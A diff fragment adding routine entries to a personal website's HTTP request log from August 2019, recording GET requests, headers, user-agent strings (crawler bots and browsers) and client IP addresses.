+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #156==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:13:10:04:35
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "MXFIPTMX6 983117758494438191 208528992192382039 766647581511511231 829244796941845684 999660849257962039 364674768389999831 996830931708088501 930016813600821925 856090949058129647 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #157==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:14:17:42:48
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.2
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #158==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:15:02:01:58
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7"
+}
+::ffff:68.129.124.240
+{}
+{}
+**END SECURE REQUEST
+========= REQ #159==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:16:09:15:47
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.122
+{}
+{}
+**END SECURE REQUEST
+========= REQ #160==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:16:09:36:01
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.96.10
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #161==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:20:11:25:38
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.90
+{}
+{}
+**END SECURE REQUEST
+========= REQ #162==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:21:08:08:57
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.96.226
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #163==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:22:06:39:56
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "QZZ6RW8DQW 790725071547674306 857511341388997561 404114194657849935 653502856502348414 38491698630338496 884526835457873833 842515670335575784 457719397250294102 848096629424142138 123309459900854422 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #164==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:22:06:39:57
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "1TZ08LMUZMK09JDACLL 796033182597177144 759071249410553527 785203304164072309 370616372877968344 615098760942984462 274543963054943136 868046872602353271 178872442768022610 854313966671136962 462369987249781553 725006316605199301 494443113357038232 271620226198399533 425416669768078124 994620579410717173 793205036204923719 945229986935085999 555522081817815933 437244155087092839 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #165==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:23:00:23:08
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.96.202
+{}
+{}
+**END SECURE REQUEST
+========= REQ #166==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:27:00:39:51
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "accept-language": "en-US,en;q=0.5",
+  "accept-encoding": "gzip, deflate",
+  "dnt": "1",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1"
+}
+::ffff:68.129.124.240
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #167==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:27:00:40:00
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "accept-language": "en-US,en;q=0.5",
+  "accept-encoding": "gzip, deflate, br",
+  "dnt": "1",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1"
+}
+::ffff:68.129.124.240
+{}
+{}
+**END SECURE REQUEST
